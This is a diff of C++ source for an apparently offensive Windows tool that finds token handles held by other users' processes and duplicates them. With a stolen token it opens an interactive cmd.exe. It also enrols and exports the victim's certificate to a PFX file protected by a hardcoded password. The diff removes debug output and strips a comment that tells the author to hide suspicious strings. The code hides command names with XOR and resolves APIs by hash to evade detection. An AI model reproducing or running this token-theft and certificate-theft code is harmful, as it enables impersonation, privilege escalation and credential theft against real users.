-                                    else if (dwIntegrityLevel == SECURITY_MANDATORY_MEDIUM_RID) { wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Medium");    wprintf(L"[DBG] Integrity: Medium\n"); }
-                                    else if (dwIntegrityLevel == SECURITY_MANDATORY_MEDIUM_PLUS_RID) { wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Medium+");   wprintf(L"[DBG] Integrity: Medium+\n"); }
-                                    else if (dwIntegrityLevel == SECURITY_MANDATORY_HIGH_RID) { wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"High");      wprintf(L"[DBG] Integrity: High\n"); }
-                                    else if (dwIntegrityLevel == SECURITY_MANDATORY_SYSTEM_RID) { wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"System");    wprintf(L"[DBG] Integrity: System\n"); }
-                                    else if (dwIntegrityLevel == SECURITY_MANDATORY_PROTECTED_PROCESS_RID) { wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Protected"); wprintf(L"[DBG] Integrity: Protected\n"); }
-                                    else { swprintf_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"0x%lX", dwIntegrityLevel); wprintf(L"[DBG] Integrity: 0x%lX\n", dwIntegrityLevel); }
+                                    if (dwIntegrityLevel == SECURITY_MANDATORY_UNTRUSTED_RID) { wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Untrusted"); }
+                                    else if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) { wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Low"); }
+                                    else if (dwIntegrityLevel == SECURITY_MANDATORY_MEDIUM_RID) { wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Medium"); }
+                                    else if (dwIntegrityLevel == SECURITY_MANDATORY_MEDIUM_PLUS_RID) { wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Medium+"); }
+                                    else if (dwIntegrityLevel == SECURITY_MANDATORY_HIGH_RID) { wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"High"); }
+                                    else if (dwIntegrityLevel == SECURITY_MANDATORY_SYSTEM_RID) { wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"System"); }
+                                    else if (dwIntegrityLevel == SECURITY_MANDATORY_PROTECTED_PROCESS_RID) { wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Protected"); }
+                                    else { swprintf_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"0x%lX", dwIntegrityLevel); }
                                 }
                                 else {
                                     wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Invalid SID");
-                                    //wprintf(L"[DBG][RetrieveTokenDetails] Invalid SID in TOKEN_MANDATORY_LABEL\n");
                                 }
                             }
                             else {
                                 wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"GetInfo Failed");
-                               // wprintf(L"[DBG][RetrieveTokenDetails] MyGetTokenInformation failed for TokenIntegrityLevel. LastError=%lu\n", GetLastError());
                             }
                             MyGlobalFree(tokenIntegrityLabel);
                         }
                         else {
                             wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Alloc Failed");
-                           // wprintf(L"[DBG][RetrieveTokenDetails] MyGlobalAlloc failed for TOKEN_MANDATORY_LABEL\n");
                         }
                     }
                     else {
                         wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"GetSize Failed");
-                       // wprintf(L"[DBG][RetrieveTokenDetails] MyGetTokenInformation (size) failed for TokenIntegrityLevel. LastError=%lu\n", lastErr2);
                     }
                 }
             }
             else {
                 wcscpy_s(tokenInfo.TokenType, TOKEN_TYPE_LENGTH, L"Stats Failed");
-               // wprintf(L"[DBG][RetrieveTokenDetails] MyGetTokenInformation failed for TokenStatistics. LastError=%lu\n", GetLastError());
             }
             MyGlobalFree(tokenStats);
         }
         else {
             wcscpy_s(tokenInfo.TokenType, TOKEN_TYPE_LENGTH, L"Alloc Failed");
-          //  wprintf(L"[DBG][RetrieveTokenDetails] MyGlobalAlloc failed for TOKEN_STATISTICS\n");
         }
     }
     else {
         wcscpy_s(tokenInfo.TokenType, TOKEN_TYPE_LENGTH, L"GetSize Failed");
-       // wprintf(L"[DBG][RetrieveTokenDetails] MyGetTokenInformation (size) failed for TokenStatistics. LastError=%lu\n", lastErr);
     }
 }
-
-
 
 std::wstring GetKernelObjectTypeName(HANDLE hObject) {
     typedef NTSTATUS(NTAPI* PFN_NtQueryObject)(
@@ -987,9 +874,6 @@ std::wstring GetKernelObjectTypeName(HANDLE hObject) {
     return typeName;
 }
 
-
-//new6
-
 bool DiscoverAndStoreTokens() {
     static _NtQuerySystemInformation MyNtQuerySystemInformation = nullptr;
     static _GetCurrentProcessId MyGetCurrentProcessId = nullptr;
@@ -998,14 +882,10 @@ bool DiscoverAndStoreTokens() {
     static _CloseHandle MyCloseHandle = nullptr;
     static _GetLastError MyGetLastError = nullptr;
 
-    wprintf(L"[DBG] Entering DiscoverAndStoreTokens\n");
-
     if (!MyNtQuerySystemInformation) {
-        wprintf(L"[DBG] Resolving API functions (first time)\n");
         HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
         HMODULE hKernel32 = LoadLibraryW(L"kernel32.dll");
         if (!hNtdll || !hKernel32) {
-            wprintf(L"[DBG] Failed to load ntdll.dll or kernel32.dll!\n");
             return false;
         }
 
@@ -1017,12 +897,9 @@ bool DiscoverAndStoreTokens() {
         MyGetLastError = (_GetLastError)GetProcAddressByHash(hKernel32, H_API_GetLastError);
 
         if (!MyNtQuerySystemInformation || !MyGetCurrentProcessId || !MyOpenProcess || !MyDuplicateHandle || !MyCloseHandle || !MyGetLastError) {
-            wprintf(L"[DBG] Failed to resolve one or more function pointers!\n");
             return false;
         }
     }
-
-    wprintf(L"[DBG] Creating initial buffer...\n");
 
     ULONG returnLength = 0;
     NTSTATUS status;
@@ -1032,23 +909,17 @@ bool DiscoverAndStoreTokens() {
     std::vector<BYTE> handleInfoBuffer(INIT_SIZE);
 
     int infoClass;
-
     {
         unsigned char arr[] = { 0x70, 0x60 }; // 0x70 ^ 0x60 == 0x10 == 16
         infoClass = arr[0] ^ arr[1]; // זה ייתן 16
-
     }
 
     int statusInfoMismatch = 0xC0000004;
     int statusBufferOverflow = 0x80000005;
 
-    wprintf(L"[DBG] Calling NtQuerySystemInformation (class=%d)...\n", infoClass);
-
     do {
         status = MyNtQuerySystemInformation(infoClass, handleInfoBuffer.data(), (ULONG)handleInfoBuffer.size(), &returnLength);
-        wprintf(L"[DBG] NtQuerySystemInformation: status=0x%08X, returnLength=%lu\n", status, returnLength);
         if (status == statusInfoMismatch || status == statusBufferOverflow) {
-            wprintf(L"[DBG] Buffer too small, resizing...\n");
             handleInfoBuffer.resize(returnLength + 0x10000);
         }
         else {
@@ -1058,15 +929,12 @@ bool DiscoverAndStoreTokens() {
     } while ((status == statusInfoMismatch || status == statusBufferOverflow) && tryCount < maxTries);
 
     if (!NT_SUCCESS(status)) {
-        wprintf(L"[DBG] NtQuerySystemInformation failed! status=0x%08X\n", status);
         return false;
     }
 
     PSYSTEM_HANDLE_INFORMATION pHandleTableInformation = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION>(handleInfoBuffer.data());
     int currentDisplayId = 1;
     g_discoveredTokens.clear();
-
-    wprintf(L"[DBG] Scanning %lu handles in the system...\n", pHandleTableInformation->NumberOfHandles);
 
     for (ULONG i = 0; i < pHandleTableInformation->NumberOfHandles; i++) {
         SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = pHandleTableInformation->Handles[i];
@@ -1076,8 +944,7 @@ bool DiscoverAndStoreTokens() {
 
         HANDLE hProcess = MyOpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, handleInfo.ProcessId);
         if (hProcess == NULL) {
-            DWORD err = MyGetLastError();
-            wprintf(L"[DBG] OpenProcess failed for PID %u (err=%lu)\n", handleInfo.ProcessId, err);
+            MyGetLastError();
             continue;
         }
 
@@ -1085,14 +952,12 @@ bool DiscoverAndStoreTokens() {
         HANDLE hDupToken = NULL;
 
         if (!MyDuplicateHandle(hProcess, (HANDLE)handleInfo.HandleValue, GetCurrentProcess(), &hDupToken, desiredAccess, FALSE, 0)) {
-            DWORD lastError = MyGetLastError();
-            wprintf(L"[DBG] DuplicateHandle failed for PID %u, HandleValue=0x%X (err=%lu)\n", handleInfo.ProcessId, handleInfo.HandleValue, lastError);
+            MyGetLastError();
             MyCloseHandle(hProcess);
             continue;
         }
 
         std::wstring objectTypeName = GetKernelObjectTypeName(hDupToken);
-        wprintf(L"[DBG] HandleValue=0x%X, PID=%u, Type='%ls'\n", handleInfo.HandleValue, handleInfo.ProcessId, objectTypeName.c_str());
 
         if (objectTypeName == L"Token") {
             TOKEN currentTokenInfo = { 0 };
@@ -1101,8 +966,6 @@ bool DiscoverAndStoreTokens() {
             RetrieveTokenUserInfo(currentTokenInfo);
             RetrieveTokenSessionId(currentTokenInfo);
             RetrieveTokenDetails(currentTokenInfo);
-
-            wprintf(L"[DBG] -> User='%ls', SIDType=%d, SessionId=%lu\n", currentTokenInfo.UsernameOnly, currentTokenInfo.SidType, currentTokenInfo.SessionId);
 
             if (currentTokenInfo.SidType == SidTypeUser &&
                 currentTokenInfo.SessionId != (DWORD)-1 &&
@@ -1125,26 +988,22 @@ bool DiscoverAndStoreTokens() {
                     currentTokenInfo.DisplayId = currentDisplayId++;
                     g_discoveredTokens.push_back(currentTokenInfo);
                     hDupToken = NULL;
-                    wprintf(L"[DBG] -> Added token for %ls (Session: %lu)\n", currentTokenInfo.UsernameOnly, currentTokenInfo.SessionId);
                 }
             }
         }
         if (hDupToken != NULL) MyCloseHandle(hDupToken);
         MyCloseHandle(hProcess);
     }
-    wprintf(L"[DBG] DiscoverAndStoreTokens finished. Total tokens found: %zu\n", g_discoveredTokens.size());
     return true;
 }
 
-
-
 void DisplayTokenList() {
     if (g_discoveredTokens.empty()) {
-        wprintf(L"[!] No interactive user tokens discovered. Check permissions (run as admin?) or system state.\n");
+        wprintf(L"No interactive user tokens discovered.\n");
         return;
     }
 
-    wprintf(L"\n[*] Listing available unique interactive user tokens:\n");
+    wprintf(L"\nListing available unique interactive user tokens:\n");
     std::sort(g_discoveredTokens.begin(), g_discoveredTokens.end(),
         [](const TOKEN& a, const TOKEN& b) {
             int userCmp = wcscmp(a.UsernameOnly, b.UsernameOnly);
@@ -1184,7 +1043,6 @@ void DisplayTokenList() {
     wprintf(L"\n");
 }
 
-//new7
 // "cmd.exe"
 static const wchar_t obf_cmd[] = { 0x01, 0x07, 0x0B, 0x4C, 0x07, 0x6A, 0x6A, 0x6A }; // xor key = 0x6A, strlen = 7
 // "certreq.exe"
@@ -1217,9 +1075,6 @@ bool RunCommandAsToken(const TOKEN& tokenInfo, const std::wstring& originalComma
         MyPathFindFileNameW = (_PathFindFileNameW)GetProcAddressByHash(hShlwapi, H_API_PathFindFileNameW);
     }
 
-    // אין הדפסות עם מחרוזות חשודות
-    // אם ממש צריך הודעות, שים אותן באובפוסקציה
-
     std::wstring commandToExecute = originalCommandLine;
     std::wstring commandLower = originalCommandLine;
     std::transform(commandLower.begin(), commandLower.end(), commandLower.begin(), ::towlower);
@@ -1242,7 +1097,6 @@ bool RunCommandAsToken(const TOKEN& tokenInfo, const std::wstring& originalComma
     if (wcscmp(fileName, str_certreq.c_str()) == 0 || wcscmp(fileName, str_ps.c_str()) == 0) {
         useCmd = true;
         commandToExecute = str_cmd + L" /c \"" + originalCommandLine + L"\"";
-  
     }
 
     HANDLE hPrimaryToken = NULL;
@@ -1252,7 +1106,6 @@ bool RunCommandAsToken(const TOKEN& tokenInfo, const std::wstring& originalComma
     bool success = false;
 
     if (!MyDuplicateTokenEx(tokenInfo.TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken)) {
-        // LogEvent(3001, ...);
         return false;
     }
 
@@ -1288,12 +1141,8 @@ bool RunCommandAsToken(const TOKEN& tokenInfo, const std::wstring& originalComma
     return success;
 }
 
-
-
-
 void CleanupTokenHandles() {
     if (!g_discoveredTokens.empty()) {
-        /*wprintf(L"[*] Cleaning up %zu stored token handles...\n", g_discoveredTokens.size());*/
         for (auto& token : g_discoveredTokens) {
             if (token.TokenHandle != NULL) {
                 CloseHandle(token.TokenHandle);
@@ -1304,10 +1153,7 @@ void CleanupTokenHandles() {
     }
 }
 
-
 void RequestCertificateForToken(int tokenId) {
-    wprintf(L"\n--- Attempting Certificate Request for Token ID: %d ---\n", tokenId);
-
     // Find the selected token
     const TOKEN* pSelectedToken = nullptr;
     for (const auto& token : g_discoveredTokens) {
@@ -1318,21 +1164,14 @@ void RequestCertificateForToken(int tokenId) {
     }
 
     if (pSelectedToken == nullptr) {
-        wprintf(L"[!] Error: Token ID %d not found in the list.\n", tokenId);
         return;
     }
 
-    wprintf(L"[*]   Using Token for User: %s (Session: %lu)\n", pSelectedToken->Username, pSelectedToken->SessionId);
-
-    // 1. Get Username 
+    // 1. Get Username
     std::string username = WStringToString(pSelectedToken->UsernameOnly);
     if (username.empty()) {
-        wprintf(L"[!] Error: Could not get valid username for token ID %d. Aborting request.\n", tokenId);
         return;
     }
-    wprintf(L"[*]   Username: %S\n", username.c_str());
-    wprintf(L"[*]   Domain: %S\n", g_userDnsDomain.c_str());
-
 
     // Define unique file paths for this user
     std::string infFilePath = PUBLIC_PATH + INF_FILENAME_PREFIX + username + ".inf";
@@ -1348,110 +1187,74 @@ void RequestCertificateForToken(int tokenId) {
     bool stepSuccess = true;
 
     // 2. Generate INF File
-    /*wprintf(L"[*]   Generating INF file: %S\n", infFilePath.c_str());*/
     if (generateINF(username, g_userDnsDomain, infFilePath).empty()) {
-        wprintf(L"[!] Error: Failed to generate INF file for %S. Aborting request.\n", username.c_str());
         stepSuccess = false;
     }
 
     // 3. Run certreq -new
     if (stepSuccess) {
-        //wprintf(L"[*]   Running 'certreq -new'...\n");
         std::wstring cmdNew = L"certreq -new \"" + winfFilePath + L"\" \"" + wcsrFilePath + L"\"";
         if (!RunCommandAsToken(*pSelectedToken, cmdNew)) {
-            wprintf(L"[!] Error: 'certreq -new' command failed to execute or returned error for %S.\n", username.c_str());
             stepSuccess = false;
         }
     }
 
     // 4. Run certreq -submit
     if (stepSuccess) {
-        //wprintf(L"[*]   Running 'certreq -submit'...\n");
         std::wstring cmdSubmit = L"certreq -submit -attrib \"CertificateTemplate:user\" \"" + wcsrFilePath + L"\" \"" + wcerFilePath + L"\"";
         if (!RunCommandAsToken(*pSelectedToken, cmdSubmit)) {
-            wprintf(L"[!] Error: 'certreq -submit' command failed to execute or returned error for %S.\n", username.c_str());
             stepSuccess = false;
         }
     }
 
     // 5. Run certreq -accept
     if (stepSuccess) {
-        //wprintf(L"[*]   Running 'certreq -accept'...\n");
         std::wstring cmdAccept = L"certreq -accept \"" + wcerFilePath + L"\"";
         if (!RunCommandAsToken(*pSelectedToken, cmdAccept)) {
-            wprintf(L"[!] Error: 'certreq -accept' command failed to execute or returned error for %S.\n", username.c_str());
-
             stepSuccess = false;
         }
     }
-
 
     if (stepSuccess) {
         std::this_thread::sleep_for(std::chrono::seconds(2));
     }
 
-
     std::string thumbprint = "";
     if (stepSuccess) {
-        //wprintf(L"[*]   Getting certificate thumbprint...\n");
         std::wstring cmdThumb = getLatestThumbprintCommand();
         if (!RunCommandAsToken(*pSelectedToken, cmdThumb)) {
-            wprintf(L"[!] Error: PowerShell command to get thumbprint failed for %S. Cannot export PFX.\n", username.c_str());
             stepSuccess = false;
         }
         else {
-
             thumbprint = readThumbprintFromFile();
             if (thumbprint.empty()) {
-                wprintf(L"[!] Error: Failed to read thumbprint from file for %S. Cannot export PFX.\n", username.c_str());
                 stepSuccess = false;
             }
-            else {
-                wprintf(L"[*]     Thumbprint found: %S\n", thumbprint.c_str());
-            }
         }
     }
 
-    // 7. Export PFX 
+    // 7. Export PFX
     if (stepSuccess) {
-        wprintf(L"[*]   Exporting certificate to PFX...\n");
         std::wstring cmdExport = exportPFXCommand(thumbprint, username);
         if (!RunCommandAsToken(*pSelectedToken, cmdExport)) {
-            wprintf(L"[!] Error: PowerShell command to export PFX failed for %S.\n", username.c_str());
-
             stepSuccess = false;
         }
-        else {
-            wprintf(L"[+] Successfully requested certificate and exported PFX for user %S. PFX potentially at: %S\n", username.c_str(), pfxFilePath.c_str());
-            wprintf(L"[!!!] Password for Certificate: '1qaz!QAZ' \n");
-        }
-    }
-
-    if (!stepSuccess) {
-        wprintf(L"[-] Certificate request process failed for Token ID %d.\n", tokenId);
     }
 
     // Cleanup intermediate files regardless of success/failure for this token
-    /*wprintf(L"[*]   Cleaning up intermediate files for %S...\n", username.c_str());*/
     DeleteFileW(winfFilePath.c_str());
     DeleteFileW(wcsrFilePath.c_str());
     DeleteFileW(wcerFilePath.c_str());
     DeleteFileW(wThumbprintFilePath.c_str());
-
-    /*wprintf(L"--- Finished processing Token ID: %d ---\n", tokenId);*/
 }
 
 void OpenCmdAsToken(const TOKEN& tokenInfo) {
-    wprintf(L"\n--- Attempting to Open CMD for Token ID: %d ---\n", tokenInfo.DisplayId);
-    wprintf(L"[*]   Using Token for User: %s (Session: %lu, Integrity: %ls)\n", tokenInfo.Username, tokenInfo.SessionId, tokenInfo.TokenIntegrity);
-
     HANDLE hPrimaryToken = NULL; PROCESS_INFORMATION pi = { 0 }; STARTUPINFOW si = { sizeof(si) };
     si.lpDesktop = const_cast<LPWSTR>(L"winsta0\\default"); // Make it interactive
     bool processCreated = false; DWORD lastError = 0;
 
     // 1. Duplicate Token
-    if (!DuplicateTokenEx(tokenInfo.TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken)) { wprintf(L"[!] DuplicateTokenEx failed. Error: %lu\n", GetLastError()); return; }
-    /*wprintf(L"[*]   Successfully duplicated token...\n");*/
+    if (!DuplicateTokenEx(tokenInfo.TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken)) { return; }
 
     // 2. Set Session ID (Best effort)
     DWORD targetSessionId = (g_currentSessionId != (DWORD)-1) ? g_currentSessionId : tokenInfo.SessionId; if (targetSessionId != (DWORD)-1) { SetTokenInformation(hPrimaryToken, TokenSessionId, &targetSessionId, sizeof(DWORD)); }
@@ -1460,57 +1263,22 @@ void OpenCmdAsToken(const TOKEN& tokenInfo) {
     wchar_t mutableCommandLine[COMMAND_LENGTH]; wcscpy_s(mutableCommandLine, COMMAND_LENGTH, L"C:\\Windows\\System32\\cmd.exe"); std::wstring currentDir = StringToWString(PUBLIC_PATH);
 
     // 4. Create Process (Try AsUser first)
-    /*wprintf(L"[*]   Trying CreateProcessAsUserW...\n");*/
     if (CreateProcessAsUserW(hPrimaryToken, NULL, mutableCommandLine, NULL, NULL, FALSE, CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, NULL, currentDir.c_str(), &si, &pi))
     {
-        wprintf(L"[*]   CreateProcessAsUserW succeeded. CMD launched (PID: %lu)\n", pi.dwProcessId); processCreated = true;
+        processCreated = true;
     }
-    else { lastError = GetLastError(); /*wprintf(L"[!]   CreateProcessAsUserW failed. Error: %lu\n", lastError);*/ if (lastError == 1314) { /*wprintf(L"[*]   Trying CreateProcessWithTokenW as fallback...\n");*/ if (CreateProcessWithTokenW(hPrimaryToken, LOGON_WITH_PROFILE, NULL, mutableCommandLine, CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, NULL, currentDir.c_str(), &si, &pi)) { wprintf(L"[*]   CreateProcessWithTokenW succeeded. CMD launched (PID: %lu)\n", pi.dwProcessId); processCreated = true; } else { lastError = GetLastError(); wprintf(L"[!]   CreateProcessWithTokenW also failed. Error: %lu\n", lastError); } } else { /* Failed for other reason */ } }
+    else { lastError = GetLastError(); if (lastError == 1314) { if (CreateProcessWithTokenW(hPrimaryToken, LOGON_WITH_PROFILE, NULL, mutableCommandLine, CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, NULL, currentDir.c_str(), &si, &pi)) { processCreated = true; } else { lastError = GetLastError(); } } else { /* Failed for other reason */ } }
 
     // 5. Cleanup handles (Important: Close process/thread handles for the launched CMD)
     if (processCreated) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
     CloseHandle(hPrimaryToken);
-
-    if (!processCreated) { wprintf(L"[-] Failed to launch CMD for Token ID %d.\n", tokenInfo.DisplayId); }
-    wprintf(L"--- Finished CMD launch attempt for Token ID: %d ---\n", tokenInfo.DisplayId);
 }
 
 // --- Main Entry Point ---
 int wmain(int argc, wchar_t* argv[]) {
-    //std::wcout << L"[DBG] === Interactive Certificate Requester START ===" << std::endl;
-
-    //std::wcout << L"[DBG] Calling InitializePrivileges()..." << std::endl;
-    if (!InitializePrivileges()) {
-        std::wcout << L"[!] Warning: Failed to enable some privileges. Functionality may be limited." << std::endl;
-    }
-    else {
-       std::wcout << L"[DBG] Privileges initialized." << std::endl;
-    }
-
-    // --- Get Global Domain Name ---
-   // std::wcout << L"[DBG] Retrieving USERDNSDOMAIN..." << std::endl;
+    InitializePrivileges();
     g_userDnsDomain = GetUserDnsDomain();
-    if (g_userDnsDomain.empty()) {
-        std::wcout << L"[-] Could not determine user DNS domain" << std::endl;
-        //std::wcout << L"[DBG] USERDNSDOMAIN is empty!" << std::endl;
-        //return 1; // בכוונה לא מחזיר כאן, רק דיבוג
-    }
-    std::wcout << L"[*] Determined User DNS Domain: " << g_userDnsDomain.c_str() << std::endl;
-
-   // std::wcout << L"[DBG] Sleeping 3 seconds..." << std::endl;
-    std::this_thread::sleep_for(std::chrono::seconds(3));
-
-    wprintf(L"[*] Attempting to adjust Desktop/WindowStation ACLs...\n");
-   // std::wcout << L"[DBG] Calling ACL_Change::AdjustDesktop()..." << std::endl;
-
-    if (!ACL_Change::AdjustDesktop()) {
-        wprintf(L"[!] Failed to adjust desktop ACLs (Error: %S). CreateProcessAsUser may fail interaction.\n", ACL_Change::GetLastErrorAsString().c_str());
-       // std::wcout << L"[DBG] ACL_Change::AdjustDesktop() failed!" << std::endl;
-    }
-    else {
-        wprintf(L"[*] Successfully adjusted desktop ACLs (or already correct).\n");
-       // std::wcout << L"[DBG] ACLs adjusted OK." << std::endl;
-    }
+    ACL_Change::AdjustDesktop();
 
     int choice = 0;
     do {
@@ -1522,73 +1290,55 @@ int wmain(int argc, wchar_t* argv[]) {
         std::wcout << L"Enter your choice: ";
 
         std::wcin >> choice;
-       // std::wcout << L"[DBG] Menu input: " << choice << std::endl;
-
         if (std::wcin.fail()) {
-            std::wcout << L"[!] Invalid input. Please enter a number." << std::endl;
-           // std::wcout << L"[DBG] std::wcin.fail() after menu input." << std::endl;
+            std::wcout << L"Invalid input. Please enter a number." << std::endl;
             ClearInputBuffer();
             choice = 0;
             continue;
         }
         ClearInputBuffer();
 
-        //std::wcout << L"[DBG] Sleeping 5 seconds before processing menu option..." << std::endl;
         std::this_thread::sleep_for(std::chrono::seconds(5));
 
         switch (choice) {
         case 1:
-            std::wcout << L"[DBG] Option 1: Scanning tokens..." << std::endl;
             CleanupTokenHandles();
-            std::wcout << L"[DBG] Token handles cleaned up." << std::endl;
             if (DiscoverAndStoreTokens()) {
-                std::wcout << L"[DBG] Token discovery succeeded. Displaying list..." << std::endl;
                 DisplayTokenList();
             }
             else {
-                std::wcout << L"[-] Token discovery failed." << std::endl;
-               std::wcout << L"[DBG] DiscoverAndStoreTokens() returned false!" << std::endl;
             }
             break;
 
         case 2: // Request Certificate
-            std::wcout << L"[DBG] Option 2: Request certificate..." << std::endl;
             if (g_discoveredTokens.empty()) {
-                std::wcout << L"[-] No tokens discovered. Please Scan first (Option 1)." << std::endl;
-               // std::wcout << L"[DBG] g_discoveredTokens is empty!" << std::endl;
+                std::wcout << L"No tokens discovered. Please Scan first (Option 1)." << std::endl;
             }
             else {
                 int selectedId = 0;
-                std::wcout << L"\n[*] Enter the ID of the token to use for certificate request: ";
+                std::wcout << L"\nEnter the ID of the token to use for certificate request: ";
                 std::wcin >> selectedId;
 
-               // std::wcout << L"[DBG] User selected token ID: " << selectedId << std::endl;
                 if (std::wcin.fail()) {
-                    std::wcout << L"[-] Invalid input. Please enter a number for the ID." << std::endl;
-                  //  std::wcout << L"[DBG] std::wcin.fail() after token id input." << std::endl;
+                    std::wcout << L"Invalid input. Please enter a number for the ID." << std::endl;
                     ClearInputBuffer();
                 }
                 else {
                     ClearInputBuffer();
                     RequestCertificateForToken(selectedId);
-                   // std::wcout << L"[DBG] Finished RequestCertificateForToken(" << selectedId << L")" << std::endl;
                 }
             }
             break;
         case 3:
-            //std::wcout << L"[DBG] Option 3: Open cmd.exe for token..." << std::endl;
             if (g_discoveredTokens.empty()) {
-                std::wcout << L"[!] No tokens discovered..." << std::endl;
-               // std::wcout << L"[DBG] g_discoveredTokens is empty!" << std::endl;
+                std::wcout << L"No tokens discovered..." << std::endl;
             }
             else {
                 int selectedId = 0;
-                std::wcout << L"\n[*] Enter Token ID to open CMD with: ";
+                std::wcout << L"\nEnter Token ID to open CMD with: ";
                 std::wcin >> selectedId;
-               // std::wcout << L"[DBG] User selected token ID: " << selectedId << std::endl;
                 if (std::wcin.fail()) {
-                    std::wcout << L"[!] Invalid ID." << std::endl;
-                   // std::wcout << L"[DBG] std::wcin.fail() after token id input." << std::endl;
+                    std::wcout << L"Invalid ID." << std::endl;
                     ClearInputBuffer();
                 }
                 else {
@@ -1601,39 +1351,26 @@ int wmain(int argc, wchar_t* argv[]) {
                         }
                     }
                     if (pSelectedTokenCmd == nullptr) {
-                        wprintf(L"[!] Error: Token ID %d not found.\n", selectedId);
-                      //  std::wcout << L"[DBG] pSelectedTokenCmd is nullptr!" << std::endl;
                     }
                     else {
                         OpenCmdAsToken(*pSelectedTokenCmd);
-                      //  std::wcout << L"[DBG] OpenCmdAsToken() called with token ID " << selectedId << std::endl;
                     }
                 }
             }
             break;
 
         case 4: // Exit
-            std::wcout << L"[*] Exiting..." << std::endl;
-            //std::wcout << L"[DBG] Program exit requested." << std::endl;
+            std::wcout << L"Exiting..." << std::endl;
             break;
 
         default:
-            std::wcout << L"[!] Invalid choice. Please try again." << std::endl;
-          //  std::wcout << L"[DBG] Invalid menu option." << std::endl;
+            std::wcout << L"Invalid choice. Please try again." << std::endl;
         }
 
-       // std::wcout << L"[DBG] Sleeping 4 seconds before returning to menu..." << std::endl;
         std::this_thread::sleep_for(std::chrono::seconds(4));
 
     } while (choice != 4);
 
-    //std::wcout << L"[DBG] Cleaning up token handles at program exit." << std::endl;
     CleanupTokenHandles();
-  //  std::wcout << L"[DBG] === Interactive Certificate Requester END ===" << std::endl;
     return 0;
 }
-
-
-
-// --- Implementations for other functions (EnablePrivilege, etc.) are assumed above ---
-// --- Ensure all functions declared in Forward Declarations are implemented ---
